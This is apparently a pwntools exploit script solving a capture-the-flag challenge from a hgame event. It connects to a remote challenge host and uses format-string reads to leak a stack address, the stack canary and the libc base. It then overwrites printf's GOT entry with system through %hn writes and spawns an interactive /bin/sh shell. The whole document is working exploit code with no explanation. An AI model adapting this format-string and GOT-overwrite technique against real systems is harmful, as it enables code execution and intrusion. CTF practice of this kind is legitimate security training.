from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(["./vuln"])
sh = remote("week-2.hgame.lwsec.cn", 30937)
elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")

sh.send(b"A"*(0x100-6) + b"B"*6)

sh.recvuntil(b'BBBBBB')
stack = u64(sh.recv(6).ljust(8, b'\x00'))
rbp = stack - 0x10  # 42 -> rbp
printf_got = elf.got['printf']
print(hex(rbp))

sh.sendlineafter(b'anything else?', b"y")
sh.sendline(p64(rbp+0x08))
sh.sendlineafter(b'anything else?', b"n")

payload = f"%41$p||%45$p"
payload += f"%{str(0x158F-0x12-0x10)}c%8$hn"

sh.sendlineafter(b'Yukkri prepared a gift for you:', payload.encode())
# sh.sendlineafter(b'Yukkri prepared a gift for you:', "%79$p")
sh.recvuntil(b'0x')
canary = int(sh.recvuntil(b'||', drop=True).decode(), 16)
print(hex(canary))
libc_base = int(sh.recv(14).decode(), 16) - 0x24083
print(hex(libc_base))
system_addr = libc_base + libc.sym['system']
vuln_read_addr = 0x40167D



sh.sendlineafter(b'What would you like to let Yukkri say?', p64(printf_got) + p64(printf_got+2) + p64(rbp+0x18) + p64(rbp+0x1A) + p64(rbp+0x1C))
sh.sendlineafter(b'anything else?', b"n")
# gdb.attach(sh, 'b *0x4016A4') 
# pause()

payload_padding = sorted([('%8$hn', system_addr & 0xffff),
                          ('%9$hhn', (system_addr & 0xff0000) >> 16),
                          ('%10$hn', vuln_read_addr & 0xffff),
                          ('%11$hn',((vuln_read_addr & 0xff0000) >> 16)),
                          ('%12$hn', 0)], key=lambda x: x[1])
print(payload_padding)

payload2 = ''
nums = 0
for i in payload_padding:
    payload2 += f'%{i[1]-nums}c{i[0]}' if i[1] != nums else f'{i[0]}'
    nums = i[1]
print(payload2)
print(hex(system_addr), hex(vuln_read_addr))
sh.sendlineafter(b'Yukkri prepared a gift for you:', payload2.encode())

sh.sendline(b"/bin/sh\x00\x00")
sh.interactive()